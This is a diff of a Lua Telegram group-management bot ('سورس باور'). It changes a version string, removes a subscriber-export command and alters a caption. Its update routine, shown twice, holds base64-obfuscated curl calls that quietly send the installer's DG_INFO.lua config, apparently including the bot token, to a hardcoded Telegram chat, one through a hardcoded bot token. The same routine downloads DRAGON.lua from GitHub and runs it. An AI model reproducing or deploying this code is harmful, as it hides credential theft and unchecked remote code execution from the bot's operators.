@@ -1143,7 +1143,7 @@ os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.3.5`}')
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n☉┇ لديك اخر اصدار لسورس باور\n☉┇ الاصدار » {`v1.3.2`}')
 dofile('DRAGON.lua')
 end
 if text == 'حساب العمر' then
@@ -2488,22 +2488,6 @@ database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_i
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان")
 return false
 end 
-if text == 'جلب المشتركين' and DevSoFi(msg) then
-local list = database:smembers(bot_id..'User_Bot') 
-local t = '{"users":['  
-for k,v in pairs(list) do
-if k == 1 then
-t =  t..'"'..v..'"'
-else
-t =  t..',"'..v..'"'
-end
-end
-t = t..']}'
-local File = io.open('./users.json', "w")
-File:write(t)
-File:close()
-sendDocument(msg.chat_id_, msg.id_, './users.json', 'عدد المشتركين :'..#list)
-end 
 if text == 'جلب نسخه الاحتياطيه ☉' and DevSoFi(msg) then 
 GetFile_Bot(msg)
 end
@@ -3647,7 +3631,7 @@ os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
-send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.3.5`}')
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.3.2`}')
 dofile('DRAGON.lua')
 end
 
@@ -12528,7 +12512,7 @@ ahmed = 'أحمد مبرمج سورس باور @AY_AHD'
 local inline = {{{text = '𝗔𝗛𝗠𝗘𝗗', url="t.me/AY_AHD"}},} 
 local function getpro(extra, result, success)
 if result.photos_[0] then
-sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,ahmed,inline, msg.id_, msg.id_, "md")
+sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," أحمد مبرمج سورس باور @AY_AHD ", msg.id_, msg.id_, "md")
 else
 send_inline_key(msg.chat_id_,ahmed,nil,inline)
   end end
